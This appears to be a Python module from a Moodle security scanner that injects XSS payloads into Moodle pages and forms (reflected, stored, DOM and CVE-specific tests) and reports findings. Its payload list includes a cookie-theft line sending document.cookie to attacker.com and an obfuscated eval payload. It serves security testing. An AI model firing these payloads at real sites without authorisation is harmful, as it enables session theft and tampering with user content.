#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Module for testing XSS vulnerabilities in Moodle
Part of the Moodle Security Scanner project
"""

import re
import requests
import logging
import time
import random
import string
import urllib.parse
from bs4 import BeautifulSoup

class MoodleXSSTester:
    """Class for testing XSS vulnerabilities in Moodle"""
    
    def __init__(self, target_url, logger=None, timeout=30, proxy=None, cookies=None, delay=0):
        """Initialize the Moodle XSS tester"""
        self.target_url = target_url
        self.timeout = timeout
        self.proxy = proxy
        self.cookies = cookies
        self.delay = delay
        self.version_info = None
        
        # XSS payloads to test
        self.xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<a onmouseover=alert(1)>xss link</a>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\"></iframe>",
            "<video><source onerror=\"javascript:alert(1)\">",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "'>\"><script>alert(1)</script>",
            "';alert(1);//",
            "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
            "<img src=x onerror=\"eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))\">",
            "<svg><g onload=\"javascript:alert(1)\"></g></svg>"
        ]
        
        # Reflected XSS potential entry points
        self.reflected_xss_params = [
            "search", "query", "q", "id", "name", "keyword", "term", "file", 
            "url", "return", "returnurl", "redirect", "link", "dir", "path", 
            "page", "message", "error", "success", "info", "warning"
        ]
        
        # Set up logging
        if logger:
            self.logger = logger
        else:
            self.logger = logging.getLogger("MoodleXSSTester")
            self.logger.setLevel(logging.INFO)
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
        
        # Initialize HTTP session
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        if cookies:
            self.session.cookies.update(cookies)
    
    def set_version_info(self, version_info):
        """Set version information to guide testing"""
        self.version_info = version_info
    
    def run_tests(self):
        """
        Run all XSS tests
        Returns a dictionary with results information
        """
        self.logger.info("Running XSS vulnerability tests...")
        
        results = {
            "vulnerabilities": [],
            "info": []
        }
        
        # Test for reflected XSS
        reflected_vulns = self.test_reflected_xss()
        if reflected_vulns:
            results["vulnerabilities"].extend(reflected_vulns)
        
        # Test for stored XSS
        stored_vulns = self.test_stored_xss()
        if stored_vulns:
            results["vulnerabilities"].extend(stored_vulns)
        
        # Test specific vulnerabilities by version
        if self.version_info and self.version_info.get("version"):
            version = self.version_info.get("version")
            version_vulns = self.test_version_specific_xss(version)
            if version_vulns:
                results["vulnerabilities"].extend(version_vulns)
        
        # Test for DOM-based XSS
        dom_vulns = self.test_dom_xss()
        if dom_vulns:
            results["vulnerabilities"].extend(dom_vulns)
        
        # Test CVE-2022-35651 (SCORM XSS)
        scorm_vuln = self.test_scorm_xss()
        if scorm_vuln:
            results["vulnerabilities"].append(scorm_vuln)
        
        self.logger.info(f"XSS vulnerability testing completed. Found {len(results['vulnerabilities'])} vulnerabilities.")
        return results
    
    def test_reflected_xss(self):
        """
        Test for reflected XSS vulnerabilities
        Returns a list of found vulnerabilities
        """
        self.logger.info("Testing for reflected XSS vulnerabilities...")
        
        vulnerabilities = []
        
        # Common pages that might be vulnerable to reflected XSS
        potential_targets = [
            "/search/index.php",
            "/user/index.php",
            "/course/index.php",
            "/mod/forum/search.php",
            "/login/forgot_password.php",
            "/user/profile.php",
            "/message/index.php",
            "/calendar/view.php",
            "/admin/search.php"
        ]
        
        # Test each target page with each parameter and payload combination
        for target in potential_targets:
            if self.delay > 0:
                time.sleep(self.delay)
            
            url = f"{self.target_url}{target}"
            
            try:
                # First check if the page is accessible
                response = self.session.get(url, timeout=self.timeout)
                
                if response.status_code != 200:
                    self.logger.debug(f"Skipping {target} - Status: {response.status_code}")
                    continue
                
                # Extract form parameters if there's a form
                form_params = self._extract_form_params(response.text)
                if form_params:
                    self.logger.debug(f"Found form parameters on {target}: {form_params}")
                    self.reflected_xss_params.extend(form_params)
                
                # Test each parameter with each payload
                for param in set(self.reflected_xss_params):
                    for payload in self.xss_payloads:
                        if self.delay > 0:
                            time.sleep(self.delay)
                        
                        encoded_payload = urllib.parse.quote(payload)
                        params = {param: payload}
                        
                        try:
                            response = self.session.get(url, params=params, timeout=self.timeout)
                            
                            # Check if the payload is reflected in the response
                            # We're using both the raw and encoded payload, as sometimes the server might htmlencode the input
                            if payload in response.text or encoded_payload in response.text:
                                # Check if payload is actually executed (by looking for signs of encoding)
                                if self._check_xss_executed(response.text, payload):
                                    self.logger.warning(f"Potential reflected XSS found on {target} with parameter {param}")
                                    
                                    vulnerabilities.append({
                                        "title": "Reflected XSS Vulnerability",
                                        "description": f"The {target} page is vulnerable to reflected XSS via the {param} parameter.",
                                        "severity": "High",
                                        "evidence": f"Payload: {payload}\nURL: {url}?{param}={encoded_payload}",
                                        "payload": payload,
                                        "url": f"{url}?{param}={encoded_payload}",
                                        "remediation": "Implement proper input validation and output encoding for user-supplied data."
                                    })
                                    
                                    # No need to test more payloads for this parameter
                                    break
                        except Exception as e:
                            self.logger.debug(f"Error testing {url} with parameter {param}: {str(e)}")
            except Exception as e:
                self.logger.debug(f"Error accessing {url}: {str(e)}")
        
        return vulnerabilities
    
    def test_stored_xss(self):
        """
        Test for stored XSS vulnerabilities
        Returns a list of found vulnerabilities
        """
        self.logger.info("Testing for stored XSS vulnerabilities...")
        
        vulnerabilities = []
        
        # Common pages that might be vulnerable to stored XSS
        potential_targets = [
            "/mod/forum/post.php",
            "/blog/edit.php",
            "/user/edit.php",
            "/mod/wiki/edit.php",
            "/mod/data/edit.php",
            "/mod/glossary/edit.php",
            "/comment/comment.php"
        ]
        
        # First, check if we're authenticated
        if not self._check_authenticated():
            self.logger.info("Not authenticated. Skipping stored XSS tests that require authentication.")
        else:
            # Test each target page
            for target in potential_targets:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                url = f"{self.target_url}{target}"
                
                try:
                    # Check if the page is accessible
                    response = self.session.get(url, timeout=self.timeout)
                    
                    if response.status_code != 200 or "login" in response.url:
                        self.logger.debug(f"Skipping {target} - Status: {response.status_code} or login required")
                        continue
                    
                    # Extract form information
                    form_data = self._extract_form_data(response.text)
                    if not form_data:
                        self.logger.debug(f"No form found on {target}")
                        continue
                    
                    # Test the first XSS payload on this form
                    # We're only using one payload to avoid creating multiple posts/comments
                    test_payload = "<img src=x onerror=alert(1)>"
                    
                    # Add the payload to text fields in the form
                    for field_name, field_type in form_data["fields"].items():
                        if field_type in ["text", "textarea", "hidden"] and not field_name.startswith("sesskey"):
                            form_data["data"][field_name] = test_payload
                    
                    # Ensure we have a reasonable minimum of data for the form
                    if "subject" in form_data["data"] and not form_data["data"]["subject"]:
                        form_data["data"]["subject"] = "XSS Test"
                    
                    if "message" in form_data["data"] and not form_data["data"]["message"]:
                        form_data["data"]["message"] = test_payload
                    
                    # Submit the form
                    if self.delay > 0:
                        time.sleep(self.delay)
                    
                    response = self.session.post(form_data["action"], data=form_data["data"], timeout=self.timeout)
                    
                    # Check if submission was successful and redirected
                    if response.status_code in [200, 301, 302] and not "error" in response.url:
                        # Now check if our payload is stored and rendered without encoding
                        # We need to follow redirects or check the returned page
                        if "Location" in response.headers:
                            redirect_url = response.headers["Location"]
                            if not redirect_url.startswith("http"):
                                redirect_url = urllib.parse.urljoin(self.target_url, redirect_url)
                            
                            response = self.session.get(redirect_url, timeout=self.timeout)
                        
                        # Check if payload is in the page and potentially executed
                        if test_payload in response.text and self._check_xss_executed(response.text, test_payload):
                            self.logger.warning(f"Potential stored XSS found on {target}")
                            
                            vulnerabilities.append({
                                "title": "Stored XSS Vulnerability",
                                "description": f"The {target} page is vulnerable to stored XSS.",
                                "severity": "Critical",
                                "evidence": f"Payload: {test_payload}\nURL: {url}",
                                "payload": test_payload,
                                "url": url,
                                "remediation": "Implement proper input validation and output encoding for user-supplied data."
                            })
                except Exception as e:
                    self.logger.debug(f"Error testing stored XSS on {target}: {str(e)}")
        
        return vulnerabilities
    
    def test_version_specific_xss(self, version):
        """
        Test for XSS vulnerabilities specific to the detected Moodle version
        Returns a list of found vulnerabilities
        """
        self.logger.info(f"Testing for version-specific XSS vulnerabilities in Moodle {version}...")
        
        vulnerabilities = []
        
        # Check for specific known XSS vulnerabilities based on version
        known_vulnerabilities = {
            # Format: 'version pattern': [{'endpoint': '/path', 'param': 'param_name', 'payload': 'xss_payload', 'cve': 'CVE-ID'}]
            "3.9": [
                {
                    "endpoint": "/lib/editor/atto/autosave-ajax.php",
                    "param": "elementid",
                    "payload": "x\"><img src=x onerror=alert(1)>",
                    "cve": "CVE-2020-14432"
                }
            ],
            "3.10": [
                {
                    "endpoint": "/question/question.php",
                    "param": "cmid",
                    "payload": "1' onmouseover='alert(1)'",
                    "cve": "CVE-2021-36393"
                }
            ],
            "3.11": [
                {
                    "endpoint": "/mod/lti/auth.php",
                    "param": "redirect",
                    "payload": "javascript:alert(1)",
                    "cve": "CVE-2021-32478"
                }
            ],
            "4.0": [
                {
                    "endpoint": "/course/exportsettings.php",
                    "param": "returnto",
                    "payload": "javascript:alert(1)",
                    "cve": "CVE-2022-0326"
                }
            ]
        }
        
        # Find matching vulnerabilities for the detected version
        for ver_pattern, vulns in known_vulnerabilities.items():
            if version.startswith(ver_pattern):
                self.logger.info(f"Found potential vulnerabilities for Moodle {ver_pattern}")
                
                for vuln in vulns:
                    if self.delay > 0:
                        time.sleep(self.delay)
                    
                    url = f"{self.target_url}{vuln['endpoint']}"
                    params = {vuln['param']: vuln['payload']}
                    
                    try:
                        response = self.session.get(url, params=params, timeout=self.timeout)
                        
                        # Check if the vulnerability might be present
                        if vuln['payload'] in response.text and self._check_xss_executed(response.text, vuln['payload']):
                            self.logger.warning(f"Potential version-specific XSS found on {vuln['endpoint']} (CVE: {vuln['cve']})")
                            
                            vulnerabilities.append({
                                "title": f"XSS Vulnerability (CVE: {vuln['cve']})",
                                "description": f"The {vuln['endpoint']} endpoint is vulnerable to XSS via the {vuln['param']} parameter.",
                                "severity": "High",
                                "evidence": f"Payload: {vuln['payload']}\nURL: {url}?{vuln['param']}={urllib.parse.quote(vuln['payload'])}",
                                "payload": vuln['payload'],
                                "url": f"{url}?{vuln['param']}={urllib.parse.quote(vuln['payload'])}",
                                "cve": vuln['cve'],
                                "remediation": "Update to the latest Moodle version or apply the security patch."
                            })
                    except Exception as e:
                        self.logger.debug(f"Error testing version-specific XSS on {vuln['endpoint']}: {str(e)}")
        
        # Also check if the version itself is vulnerable to the recent Calculated Questions RCE (which is XSS-related)
        if self._check_calculated_question_xss_rce_vulnerable(version):
            vulnerabilities.append({
                "title": "Calculated Question XSS/RCE Vulnerability",
                "description": "The Moodle installation appears to be vulnerable to a Remote Code Execution vulnerability in calculated questions. "
                              "This vulnerability allows authenticated users with the ability to create calculated questions to execute "
                              "arbitrary PHP code on the server by manipulating the answer formula.",
                "severity": "Critical",
                "cve": "CVE-2024-4296",
                "evidence": f"Moodle version {version} is in the vulnerable range (< 4.4.2, < 4.3.6, < 4.2.9, or < 4.1.12).",
                "remediation": "Update to Moodle versions 4.4.2, 4.3.6, 4.2.9, or 4.1.12 or later. "
                              "If updating is not immediately possible, restrict access to question creation features.",
                "references": [
                    "https://blog.redteam-pentesting.de/2024/moodle-rce/",
                    "https://moodle.org/mod/forum/discuss.php?d=450803"
                ]
            })
        
        return vulnerabilities
    
    def test_dom_xss(self):
        """
        Test for DOM-based XSS vulnerabilities
        Returns a list of found vulnerabilities
        """
        self.logger.info("Testing for DOM-based XSS vulnerabilities...")
        
        vulnerabilities = []
        
        # Common URL fragments that might trigger DOM-based XSS
        dom_xss_patterns = [
            "#<img src=x onerror=alert(1)>",
            "#javascript:alert(1)",
            "#'-alert(1)-'",
            "#</script><script>alert(1)</script>",
            "#data=javascript:alert(1)"
        ]
        
        # Common pages that might be vulnerable to DOM-based XSS
        potential_targets = [
            "/",
            "/course/view.php",
            "/user/view.php",
            "/mod/forum/view.php",
            "/my/"
        ]
        
        for target in potential_targets:
            if self.delay > 0:
                time.sleep(self.delay)
            
            base_url = f"{self.target_url}{target}"
            
            try:
                # First check if the page is accessible
                response = self.session.get(base_url, timeout=self.timeout)
                
                if response.status_code != 200:
                    self.logger.debug(f"Skipping {target} - Status: {response.status_code}")
                    continue
                
                # Check for JavaScript that might handle URL fragments
                js_handlers = self._check_js_fragment_handlers(response.text)
                
                if js_handlers:
                    self.logger.debug(f"Found potential JS fragment handlers on {target}")
                    
                    # Test each fragment pattern
                    for pattern in dom_xss_patterns:
                        if self.delay > 0:
                            time.sleep(self.delay)
                        
                        url = f"{base_url}{pattern}"
                        
                        try:
                            response = self.session.get(url, timeout=self.timeout)
                            
                            # Check if there are indicators that our fragment was processed by JS
                            # This is more of a heuristic, as we can't actually execute the JS in python
                            if "<img src=x onerror=" in response.text or "javascript:alert" in response.text:
                                self.logger.warning(f"Potential DOM-based XSS found on {target}")
                                
                                vulnerabilities.append({
                                    "title": "DOM-based XSS Vulnerability",
                                    "description": f"The {target} page might be vulnerable to DOM-based XSS.",
                                    "severity": "Medium",
                                    "evidence": f"Page contains JavaScript that processes URL fragments and might not sanitize them properly.",
                                    "payload": pattern,
                                    "url": url,
                                    "remediation": "Sanitize URL fragments properly before using them in the DOM."
                                })
                                
                                # No need to test more patterns for this target
                                break
                        except Exception as e:
                            self.logger.debug(f"Error testing DOM-based XSS on {url}: {str(e)}")
            except Exception as e:
                self.logger.debug(f"Error accessing {base_url}: {str(e)}")
        
        return vulnerabilities
    
    def test_scorm_xss(self):
        """
        Test for SCORM XSS vulnerability (CVE-2022-35651)
        Returns a vulnerability if found
        """
        self.logger.info("Testing for SCORM XSS vulnerability (CVE-2022-35651)...")
        
        # Check if the version is vulnerable
        if self.version_info and self.version_info.get("version"):
            version = self.version_info.get("version")
            
            if (version.startswith("4.0") and version < "4.0.5") or \
               (version.startswith("3.11") and version < "3.11.8") or \
               (version.startswith("3.10") and version < "3.10.11") or \
               (version.startswith("3.9") and version < "3.9.14"):
                self.logger.warning(f"Moodle version {version} is vulnerable to SCORM XSS (CVE-2022-35651)")
                
                return {
                    "title": "SCORM XSS and Blind SSRF Vulnerability",
                    "description": "The Moodle installation is vulnerable to stored XSS and blind SSRF via SCORM track details.",
                    "severity": "High",
                    "cve": "CVE-2022-35651",
                    "evidence": f"Moodle version {version} is in the vulnerable range.",
                    "remediation": "Update to Moodle versions 4.0.5, 3.11.8, 3.10.11, 3.9.14 or later.",
                    "references": [
                        "https://moodle.org/mod/forum/discuss.php?d=437497",
                        "https://www.cvedetails.com/cve/CVE-2022-35651"
                    ]
                }
        
        # If we don't know the version or it's not in the vulnerable range, try to detect the vulnerability directly
        scorm_url = f"{self.target_url}/mod/scorm/report/userreport.php"
        if self.delay > 0:
            time.sleep(self.delay)
        
        try:
            response = self.session.get(scorm_url, timeout=self.timeout)
            
            if response.status_code == 200 and "SCORM" in response.text:
                self.logger.debug("SCORM module seems to be available")
                
                # Check if we have access to create or modify SCORM content
                if "report.php" in response.text and "userreport.php" in response.text:
                    self.logger.debug("Might have access to SCORM reporting functions")
                    
                    # We can't actually test the vulnerability without creating a SCORM package
                    # and uploading it, which is too invasive for an automated scanner
                    # So we'll just make a note of the potential vulnerability
                    self.logger.info("SCORM module is available and might be vulnerable to XSS/SSRF")
                    
                    return {
                        "title": "Potential SCORM XSS and Blind SSRF Vulnerability",
                        "description": "The Moodle installation has the SCORM module enabled, which might be vulnerable to XSS and SSRF attacks.",
                        "severity": "Medium",
                        "evidence": "SCORM module is enabled and accessible.",
                        "remediation": "Update to the latest Moodle version and ensure SCORM content is properly sanitized."
                    }
        except Exception as e:
            self.logger.debug(f"Error testing SCORM XSS vulnerability: {str(e)}")
        
        return None
    
    def _extract_form_params(self, html_content):
        """Extract parameter names from forms in the HTML content"""
        soup = BeautifulSoup(html_content, 'html.parser')
        form_params = []
        
        # Find all forms
        forms = soup.find_all('form')
        for form in forms:
            # Find all input elements
            inputs = form.find_all(['input', 'textarea', 'select'])
            for input_elem in inputs:
                if input_elem.has_attr('name'):
                    form_params.append(input_elem['name'])
        
        return form_params
    
    def _extract_form_data(self, html_content):
        """Extract form data including action URL and all fields with their types"""
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Find the first form
        form = soup.find('form')
        if not form:
            return None
        
        # Get form action
        action = form.get('action', '')
        if not action.startswith('http'):
            action = urllib.parse.urljoin(self.target_url, action)
        
        # Get all form fields
        fields = {}
        data = {}
        
        inputs = form.find_all(['input', 'textarea', 'select'])
        for input_elem in inputs:
            if input_elem.has_attr('name'):
                name = input_elem['name']
                input_type = input_elem.get('type', 'text') if input_elem.name == 'input' else input_elem.name
                fields[name] = input_type
                
                # Add default value if present
                if input_elem.has_attr('value'):
                    data[name] = input_elem['value']
                elif input_type == 'textarea':
                    data[name] = input_elem.string or ''
                else:
                    data[name] = ''
        
        return {
            "action": action,
            "fields": fields,
            "data": data
        }
    
    def _check_xss_executed(self, html_content, payload):
        """
        Check if the XSS payload might be executed based on how it appears in the HTML
        Returns True if it seems like the payload might be executed, False otherwise
        """
        # If payload is not in the content, it's not executed
        if payload not in html_content:
            return False
        
        # Simple heuristic checks
        # 1. Check if payload appears inside HTML attribute values with proper quotes
        attr_pattern = f'="[^"]*{re.escape(payload)}[^"]*"'
        if re.search(attr_pattern, html_content):
            return False
        
        # 2. Check if payload is HTML-encoded
        encoded_chars = ['&lt;', '&gt;', '&quot;', '&#039;', '&amp;']
        for char in encoded_chars:
            if char in html_content and char not in payload:
                return False
        
        # 3. Check if script tags in payload are intact
        if "<script>" in payload and "</script>" in payload:
            script_pattern = f'{re.escape("<script>")}.*?{re.escape("</script>")}'
            if not re.search(script_pattern, html_content, re.DOTALL):
                return False
        
        # If none of the above checks failed, the payload might be executed
        return True
    
    def _check_authenticated(self):
        """Check if the session is authenticated"""
        # Try to access the dashboard or my page, which usually requires authentication
        my_url = f"{self.target_url}/my/"
        try:
            response = self.session.get(my_url, timeout=self.timeout)
            
            # If we're redirected to login page, we're not authenticated
            if "login" in response.url:
                return False
            
            # If we get a 200 status and find dashboard elements, we're authenticated
            if response.status_code == 200 and ("Dashboard" in response.text or "My courses" in response.text):
                return True
            
            return False
        except Exception as e:
            self.logger.debug(f"Error checking authentication status: {str(e)}")
            return False
    
    def _check_js_fragment_handlers(self, html_content):
        """
        Check if the page contains JavaScript that might handle URL fragments
        Returns a list of fragment handler patterns found
        """
        handlers = []
        
        # Common patterns for JavaScript that handles URL fragments
        js_patterns = [
            r'location\.hash',
            r'window\.location\.hash',
            r'document\.location\.hash',
            r'hash\s*=',
            r'substring\(1\)',  # Often used with hash to remove the # character
            r'split\([\'"]#[\'"]\)',
            r'split\(/[#?]/\)'
        ]
        
        for pattern in js_patterns:
            if re.search(pattern, html_content):
                handlers.append(pattern)
        
        return handlers
    
    def _check_calculated_question_xss_rce_vulnerable(self, version):
        """
        Check if the version is vulnerable to the Calculated Question XSS/RCE vulnerability
        Returns True if vulnerable, False otherwise
        """
        # Check based on the version
        if version.startswith("4.4") and version < "4.4.2":
            return True
        elif version.startswith("4.3") and version < "4.3.6":
            return True
        elif version.startswith("4.2") and version < "4.2.9":
            return True
        elif version.startswith("4.1") and version < "4.1.12":
            return True
        elif version.startswith("4.0") or version.startswith("3"):
            # Older versions are very likely vulnerable
            return True
        
        return False 